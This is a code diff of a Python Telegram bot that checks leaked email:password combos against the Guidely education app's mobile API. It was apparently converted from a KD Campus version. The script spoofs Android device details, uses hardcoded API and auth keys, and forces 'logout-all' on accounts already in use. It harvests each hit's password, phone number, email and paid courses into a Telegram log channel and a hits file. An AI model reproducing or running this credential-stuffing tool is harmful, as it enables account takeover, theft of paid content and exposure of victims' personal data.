@@ -1,143 +1,175 @@
-import re
 import requests
-import hashlib
+import json
+import os
+import time
+import random
+import urllib3
+import threading
+from datetime import datetime
+import re
 from concurrent.futures import ThreadPoolExecutor
 from functools import partial
-import os
-import threading
 
 # --- CONFIG ---
-MAX_THREADS = 15
+MAX_THREADS = 10 
 LOG_CHANNEL = -1004441498543
 print_lock = threading.Lock()
 
-# KD Campus API URLs
-BASE_URL = "https://web.kdcampus.live"
-LOGIN_URL = f"{BASE_URL}/android/Usersn/login_user"
-COURSES_URL = f"{BASE_URL}/android/Dashboard/get_mycourse_data_renew_new"
-IMAGE_BASE = "http://kdcampus.live/uploaded/landing_images/"
-API_KEY = "kdc123"
+# API Config
+BASE_URL = "https://mobapi.guidely.in"
+LOGIN_ENDPOINT = f"{BASE_URL}/elogin"
+LOGOUT_OTP_ENDPOINT = f"{BASE_URL}/logout-all-otp"
+LOGOUT_ALL_ENDPOINT = f"{BASE_URL}/logout-all"
+PURCHASE_ENDPOINT = f"{BASE_URL}/purchase-history/0"
 
-HEADERS = {
-    "User-Agent": "okhttp/4.10.0",
-    "Accept-Encoding": "gzip",
-    "Content-Type": "application/json; charset=UTF-8",
-    "Accept": "application/json",
+API_KEY = "85a1364c-0419-42d5-b4c9-5dbe71549743"
+AUTH_KEY = "89abbc59cbc5a457a86f76fe4293201e11aa4ccb75ef0981e0936a7a4c123eeb51c7fa4006afa6718efc88dff83d01b82715abd870c665dcc5b3d4f113359110"
+
+DEVICE_INFO = {
+    "version": "2.3.60", "brand": "samsung", "device": "star2qltechn",
+    "model": "SM-G960N", "versionSdkInt": "28", "versionRelease": "9",
+    "product": "SM-G960N", "platform": "Android"
 }
 
+COMMON_HEADERS = {
+    'accept-encoding': 'gzip', 'api-key': API_KEY,
+    'content-type': 'application/json; charset=utf-8',
+    'host': 'mobapi.guidely.in', 'platform': 'Android',
+    'user-agent': 'Dart/3.5 (dart:io)', 'Connection': 'Keep-Alive',
+}
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 # --- HELPERS ---
-def get_kd_thumb_url(image_name):
-    if not image_name:
-        return ""
-    if str(image_name).strip().startswith("http"):
-        return str(image_name).strip()
-    return IMAGE_BASE + str(image_name).strip()
+def generate_android_id():
+    import hashlib, uuid
+    return hashlib.md5(str(uuid.uuid4()).encode()).hexdigest().upper()
 
-def kd_login(phone, password):
-    """Login using sha512 hash"""
+def parse_date(date_str):
+    if not date_str or date_str in ["null", "", "0000-00-00"]: return None
     try:
-        password_hash = hashlib.sha512(password.encode()).hexdigest()
-        payload = {
-            "code": "", "valid_id": "", "api_key": API_KEY,
-            "mobilenumber": phone, "password": password_hash
-        }
-        session = requests.Session()
-        session.headers.update(HEADERS)
-        
-        resp = session.post(LOGIN_URL, json=payload, timeout=20, verify=False)
-        if not resp.text.strip():
-            return False, None, None, None, None
-        
-        resp_json = resp.json()
-        msg = resp_json.get("message", "").lower()
-        data = resp_json.get("data", {})
-        
-        is_success = ("login successful" in msg) or (str(resp_json.get("response")) == "1")
-        
-        if is_success and data:
-            userid = data.get("id")
-            token = data.get("connection_key")
-            name = data.get("name", "User")
-            if userid and token:
-                return True, str(userid), str(token), str(name), session
-        
-        # Two-step login (OTP)
-        valid_id = resp_json.get("valid_id")
-        if valid_id:
-            payload["valid_id"] = valid_id
-            resp2 = session.post(LOGIN_URL, json=payload, timeout=20, verify=False)
-            resp2_json = resp2.json()
-            data2 = resp2_json.get("data", {})
-            is_success2 = ("login successful" in resp2_json.get("message", "").lower()) or (str(resp2_json.get("response")) == "1")
-            
-            if is_success2 and data2:
-                userid = data2.get("id")
-                token = data2.get("connection_key")
-                name = data2.get("name", "User")
-                if userid and token:
-                    return True, str(userid), str(token), str(name), session
-        
-        return False, None, None, None, None
-    except:
-        return False, None, None, None, None
+        date_str = date_str.split()[0]
+        return datetime.strptime(date_str, "%Y-%m-%d")
+    except: return None
 
-def get_kd_courses(session, userid, token):
-    """Fetch all courses/batches"""
+def is_course_valid(course):
+    if course.get("pay_status") != "Completed": return False
+    if str(course.get("status")) != "1": return False
+    validity = course.get("pro_validity", "")
+    if validity and validity not in ["null", "", "0000-00-00"]:
+        expiry_date = parse_date(validity)
+        if expiry_date and expiry_date < datetime.now(): return False
+    return True
+
+def login_attempt(email, password, android_id=None, auth_token=None):
+    if not android_id: android_id = generate_android_id()
+    payload = {"email": email, "pass": password, **DEVICE_INFO, "androidId": android_id}
+    headers = COMMON_HEADERS.copy()
+    headers['auth'] = auth_token if auth_token else AUTH_KEY
     try:
-        url = f"{COURSES_URL}/{token}/{userid}/4"
-        resp = session.get(url, headers=HEADERS, timeout=25, verify=False)
-        if not resp.text.strip():
-            return []
-        
-        resp_json = resp.json()
-        if not isinstance(resp_json, list):
-            return []
-        
-        courses = []
-        for item in resp_json:
-            days_remaining = item.get("days_remaining") or item.get("remaining_days") or 0
-            try:
-                days_remaining = int(days_remaining)
-            except:
-                days_remaining = 0
-            
-            # Sirf active batches (jo expire nahi hue)
-            if days_remaining > 0:
-                course = {
-                    "batch_id": str(item.get("batch_id", "")),
-                    "batch_name": item.get("batch_name", "Unknown Batch"),
-                    "image": item.get("banner_image_name") or item.get("course_image") or "",
-                    "days_remaining": days_remaining,
-                    "price": item.get("price") or item.get("selling_price") or "N/A",
-                }
-                courses.append(course)
-        
-        return courses
-    except:
-        return []
+        resp = requests.post(LOGIN_ENDPOINT, headers=headers, json=payload, timeout=25, verify=True)
+        if resp.status_code == 200:
+            try: return resp.json()
+            except: 
+                text = resp.text.strip()
+                if text.startswith('{'): return json.loads(text)
+        return None
+    except: return None
+
+def request_logout_otp(email):
+    payload = {"emailid": email, "version": DEVICE_INFO["version"], "platform": DEVICE_INFO["platform"]}
+    headers = COMMON_HEADERS.copy()
+    headers['auth'] = AUTH_KEY
+    try:
+        resp = requests.post(LOGOUT_OTP_ENDPOINT, headers=headers, json=payload, timeout=20, verify=True)
+        if resp.status_code == 200:
+            try: return resp.json()
+            except: return None
+        return None
+    except: return None
+
+def perform_logout_all(userid):
+    payload = {
+        "brand": DEVICE_INFO["brand"], "device": DEVICE_INFO["device"],
+        "model": DEVICE_INFO["model"], "versionSdkInt": None, "versionRelease": None,
+        "product": DEVICE_INFO["product"], "androidId": None,
+        "version": DEVICE_INFO["version"], "platform": DEVICE_INFO["platform"]
+    }
+    headers = COMMON_HEADERS.copy()
+    headers['userid'] = str(userid)
+    if 'auth' in headers: del headers['auth']
+    try:
+        resp = requests.post(LOGOUT_ALL_ENDPOINT, headers=headers, json=payload, timeout=20, verify=True)
+        if resp.status_code == 200:
+            try: return resp.json()
+            except: return None
+        return None
+    except: return None
+
+def handle_multiple_login(email, password):
+    otp_resp = request_logout_otp(email)
+    if not otp_resp or otp_resp.get("success") != "1": return False, None, None
+    userid = otp_resp.get("userid")
+    if not userid: return False, None, None
+    time.sleep(random.uniform(1.0, 1.5))
+    logout_resp = perform_logout_all(userid)
+    if not logout_resp or logout_resp.get("success") != "1": return False, None, None
+    new_token = logout_resp.get("token") or logout_resp.get("access_token")
+    user_data = logout_resp.get("data", {})
+    if not new_token or not user_data: return False, None, None
+    return True, new_token, user_data
+
+def fetch_purchases(userid, auth_token):
+    all_courses = []
+    for ptype in ["5", "1"]:
+        payload = {"type": ptype, "version": DEVICE_INFO["version"], "platform": DEVICE_INFO["platform"]}
+        headers = COMMON_HEADERS.copy()
+        headers['auth'] = auth_token
+        headers['userid'] = str(userid)
+        try:
+            resp = requests.post(PURCHASE_ENDPOINT, headers=headers, json=payload, timeout=20, verify=True)
+            if resp.status_code == 200 and resp.text.strip():
+                try:
+                    data = resp.json()
+                    if isinstance(data, list): all_courses.extend(data)
+                except: pass
+        except: pass
+        time.sleep(random.uniform(0.2, 0.5))
+    return all_courses
 
 def parse_combo(line):
     line = line.strip()
-    if not line:
-        return None
-    
+    if not line or line.startswith('#'): return None
+    garbage_patterns = [r'\s*={3,}[@#].*$', r'@LOGINTEXT.*$', r';https?://.*$', r'\s+https?://.*$', r'Base Link.*$', r'\*{10,}.*$', r'----https://t\.me/.*----', r':\s*None\s*:']
+    for pattern in garbage_patterns: line = re.sub(pattern, '', line, flags=re.IGNORECASE)
+    line = re.sub(r'^https?://[^\s:]+[^\s:]*\s*:\s*', '', line)
+    line = re.sub(r'^guidely\.in[^\s:]*\s*:\s*', '', line, flags=re.IGNORECASE)
+    line = re.sub(r'\s+https?://[^\s]+$', '', line)
+    parts = line.split(':')
+    if len(parts) < 2: return None
+    username_idx = -1
+    for i, part in enumerate(parts):
+        part_clean = part.strip()
+        if '@' in part_clean: username_idx = i; break
+        if part_clean.isdigit() and len(part_clean) >= 10: username_idx = i; break
+    if username_idx == -1:
+        first = parts[0].strip()
+        if '@' in first or (first.isdigit() and len(first) >= 10): username_idx = 0
+        else: return None
+    username = parts[username_idx].strip()
+    password = ':'.join(parts[username_idx+1:]).strip()
+    password = re.sub(r'\s+https?://.*$', '', password)
+    password = re.sub(r'\s*={3,}.*$', '', password).strip()
+    if not username or not password: return None
+    if '@' not in username and not username.isdigit(): return None
+    return username, password
+
+def format_date(date_str):
+    if not date_str or date_str in ["null", "", "0000-00-00"]: return "N/A"
     try:
-        parts = line.split("*") if "*" in line else line.split(":")
-        if len(parts) < 2:
-            return None
-        password = parts[-1].strip()
-        username = parts[-2].strip()
-        if " " in username:
-            username = username.split(" ")[-1]
-        username = re.sub(r'[^0-9a-zA-Z]', '', username)
-        if username.isdigit():
-            username = username[-10:]
-        
-        if not username or not password:
-            return None
-        return username, password
-    except:
-        return None
+        dt = parse_date(date_str)
+        return dt.strftime("%d-%b-%Y") if dt else date_str[:10]
+    except: return date_str[:10] if len(date_str) >= 10 else date_str
 
 # --- BOT LOGIC ---
 def check_account(line, bot, chat_id, hits_list, state, total_lines):
@@ -148,64 +180,97 @@ def check_account(line, bot, chat_id, hits_list, state, total_lines):
             update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
         return
 
-    username, password = parsed
+    email, password = parsed
     
     try:
-        # Step 1: Login
-        success, userid, token, name, session = kd_login(username, password)
-        
-        if not success:
+        # 1. Login
+        result = login_attempt(email, password, auth_token=AUTH_KEY)
+        if not result:
             with print_lock:
                 state['checked'] += 1
                 update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
             return
 
-        # Step 2: Fetch Courses
-        courses = get_kd_courses(session, userid, token)
+        success_code = result.get("success")
+        user_data = None
+        token = None
+
+        if success_code == 1:
+            user_data = result.get("data", {})
+            token = result.get("token", "")
+        elif success_code == 3:
+            success, token, user_data = handle_multiple_login(email, password)
+            if not success:
+                with print_lock:
+                    state['checked'] += 1
+                    update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
+                return
+        else:
+            with print_lock:
+                state['checked'] += 1
+                update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
+            return
+
+        userid = user_data.get("id") if user_data else None
         
-        # Step 3: Result Handling
+        if not userid or not token:
+            with print_lock:
+                state['checked'] += 1
+                update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
+            return
+
+        # 2. Fetch Purchases
+        time.sleep(random.uniform(0.3, 0.6))
+        all_courses = fetch_purchases(userid, token)
+        valid_courses = [c for c in all_courses if is_course_valid(c)]
+
+        # 3. Result Handling
         with print_lock:
-            if courses:
+            if valid_courses:
                 state['hits'] += 1
                 state['checked'] += 1
                 
-                # DETAILED FORMAT (Like New Code)
-                hit_text = "🎓 *App : KD Campus*\n"
+                # MOBILE-FRIENDLY FORMAT
+                hit_text = "📱 *App : Guidely*\n"
                 hit_text += "━━━━━━━━━━━━━━━━━━━━\n"
-                hit_text += f"🔑 *COMBO:* `{username}:{password}`\n"
-                hit_text += f"👤 *NAME:* {name}\n"
+                hit_text += f"🔑 *COMBO:* `{email}:{password}`\n"
+                hit_text += f"👤 *NAME:* {user_data.get('name','N/A')}\n"
+                hit_text += f"📱 *MOBILE:* `{user_data.get('mobile','N/A')}`\n"
+                hit_text += f"📧 *EMAIL:* `{email}`\n"
                 hit_text += f"🆔 *USERID:* `{userid}`\n"
-                hit_text += f"🎫 *TOKEN:* `{token}`\n"
-                hit_text += f"📊 *ACTIVE BATCHES:* {len(courses)}\n"
+                hit_text += f"🛒 *VALID PURCHASES:* {len(valid_courses)}\n"
                 hit_text += "━━━━━━━━━━━━━━━━━━━━\n"
                 
-                for idx, course in enumerate(courses, 1):
-                    batch_name = course['batch_name']
-                    batch_id = course['batch_id']
-                    days = course['days_remaining']
-                    price = course['price']
-                    thumb = get_kd_thumb_url(course['image'])
+                for idx, c in enumerate(valid_courses, 1):
+                    title = c.get('title', 'N/A')
+                    amount = c.get('paided', '0')
+                    validity = c.get('pro_validity', '')
+                    expiry = format_date(validity) if validity else "Lifetime"
+                    purchased = c.get('created_at', '')[:10] if c.get('created_at') else 'N/A'
+                    ptype = c.get('type_text', '') or c.get('ptype', 'N/A')
                     
-                    hit_text += f"\n{idx}. *{batch_name}*\n"
-                    hit_text += f"   🪪 *Batch ID:* `{batch_id}`\n"
-                    hit_text += f"   💰 *Price:* ₹{price}\n"
-                    hit_text += f"   ⏳ *Left:* {days} days\n"
-                    if thumb:
-                        hit_text += f"   🖼️ *Thumbnail:* [View]({thumb})\n"
+                    hit_text += f"\n{idx}. *{title}*\n"
+                    hit_text += f"   💰 *₹{amount}* | 📅 *Purchased:* {purchased}\n"
+                    hit_text += f"   ⏳ *Valid till:* {expiry}\n"
+                    hit_text += f"   📦 *Type:* {ptype}\n"
                 
                 hit_text += "━━━━━━━━━━━━━━━━━━━━\n"
                 
                 hits_list.append(hit_text)
                 update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
                 
-                # Log Channel
+                # Log Channel with Markdown
                 try:
-                    bot.send_message(LOG_CHANNEL, hit_text, parse_mode="Markdown", disable_web_page_preview=True)
+                    bot.send_message(LOG_CHANNEL, hit_text, parse_mode="Markdown")
                 except: pass
             else:
                 state['checked'] += 1
                 update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
 
+    except Exception as e:
+        with print_lock:
+            state['checked'] += 1
+            update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines)
     except Exception as e:
         with print_lock:
             state['checked'] += 1
@@ -224,7 +289,7 @@ def update_progress(bot, chat_id, msg_id, hits, checked, total):
 ┣ 📊 Hit : {hits}
 ┣ 📂 Loaded : {checked}/{total}
 ┣ 🔥 Status : Checking...
-╰─── 𝐊𝐃 𝐂𝐚𝐦𝐩𝐮𝐬 𝐁𝐨𝐭 ───╯"""
+╰─── 𝐆𝐮𝐢𝐝𝐞𝐥𝐲 𝐁𝐨𝐭 ───╯"""
         
         bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=progress_text)
     except:
@@ -245,7 +310,7 @@ def run_check(bot, chat_id, progress_msg_id, combo_file, platform_name):
         executor.map(func, lines)
 
     # Final File
-    final_filename = "kdcampushit.txt"
+    final_filename = "guidelyhit.txt"
     if hits_list and state['hits'] > 0:
         with open(final_filename, "w", encoding="utf-8") as f:
             for hit in hits_list:
